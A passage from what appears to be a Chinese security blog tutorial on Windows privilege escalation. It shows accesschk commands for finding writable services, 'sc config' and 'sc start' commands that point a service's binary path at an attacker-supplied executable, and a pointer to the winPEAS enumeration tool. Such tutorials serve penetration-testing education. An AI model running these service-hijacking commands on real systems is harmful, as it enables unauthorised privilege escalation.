<p>原理：即使正确引用服务路径，也可能存在其他漏洞。管理配置错误，用户可能对服务拥有过多权限，可直接修改导致重定向执行文件。</p>
<p>过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 调用成功</p>
<p>检测脚本：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>accesschk.exe -uwcqv &#34;huangzonghui&#34; * -accepteula
</span></span><span style="display:flex;"><span>sc config &#34;test&#34; binpath= &#34;C:\Program.exe&#34;
</span></span><span style="display:flex;"><span>sc start test
</span></span></code></pre></div><hr>
<h1 id="综合类检测项目">综合类检测项目</h1>
<p>PEAS-ng适用于Windows、Linux/Unix*和MacOS权限提升工具
项目：<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>winPEAS.bat &gt; result.txt
</span></span><span style="display:flex;"><span>winPEASany.exe log=result.txt
</span></span></code></pre></div><p>排查信息，获取有用权限数据</p>
<p align="center"><img src="/static/屏幕截图 2025-10-23 195206.png" alt="屏幕截图 2025-10-23 195206.png"></p></section>

  
  
  <div class="paginator">
    
    <a class="prev" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/2.%E4%BA%BA%E5%B7%A5%E6%93%8D%E4%BD%9C%E4%B8%8E%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F/">
      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
      </svg>
      <span>Web到Windows系统提权：人工操作与土豆家族</span></a>
    
    
    <a class="next" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/uac%E7%BB%95%E8%BF%87_%E4%B8%8D%E5%90%8C%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/"><span>Win系统提权-本地管理用户与普通用户</span>
      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
      </svg>
    </a>
    
  </div>
  

  


</article>

        </div><footer class="footer">
  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
    Powered by
    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
️  </p>
</footer>

<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
    </svg>
</a>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };
</script>

<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'Copy';

        function copyingDone() {
            copybutton.innerHTML = 'Copied';
            setTimeout(() => {
                copybutton.innerHTML = 'Copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });
        codeblock.parentNode.appendChild(copybutton);
    });
</script></main>
    </body>
  
  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
